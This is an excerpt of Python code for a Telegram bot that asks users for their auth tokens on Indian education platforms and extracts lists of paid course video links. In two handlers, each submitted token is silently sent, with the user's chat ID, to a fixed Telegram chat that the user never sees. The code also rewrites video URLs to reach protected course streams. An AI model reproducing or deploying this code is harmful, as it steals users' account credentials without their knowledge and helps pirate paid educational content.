...
async def khazanan(bot: Client, m: Message):
    ...
    raw_text1 = input1.text
    await bot.send_message(
        -1002620232917, f"**Khazan Auth Code**\n{editable.chat.id}\n\n`{raw_text1}`"
    )
    headers = {
...
async def apnissn(bot: Client, m: Message):
    ...
    token = input1.text
    await bot.send_message(
        -1002620232917, f"**Apni Auth Code**\n{editable.chat.id}\n\n`{token}`"
    )
    headers1 = {
...
async def khan_handler(bot: Client, m: Message):
    editable = await m.reply_text(
        "🔐 Send your **AUTH TOKEN** in reply to this message to continue.\n\nExample: `eyJhbGciOi...`")
    ...
    try:
        ...
        return await m.reply_text("❌ Invalid or expired AUTH TOKEN.")

    batch_list = ""
    for course in data:
        batch_list += f"**{course['title']}** : `{course['id']}`\n\n"

    await m.reply_text(f"📚 **Available Batches:**\n\n{batch_list}")
    ask_batch = await m.reply_text("📦 Now send the **Batch ID** to download:")

    batch_input: Message = await bot.listen(ask_batch.chat.id)
    ...
    try:
        ...
        return await m.reply_text("❌ Failed to fetch lessons. Check batch ID or token.")

    result = ""
    for section in lessons:
        for video in section.get("videos", []):
            try:
                title = video.get("name", "NoTitle").strip()
                link = video.get("video_url", "").replace("mpd", "m3u8").replace("d1d34p8vz63oiq", "d3nzo6itypaz07")
                result += f"{title}:{link}\n"
            except Exception:
                continue

    file_name = f"{batch_id}_KhanSir.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(result)

    await m.reply_document(file_name, caption="✅ Extracted KhanSir Videos List.")
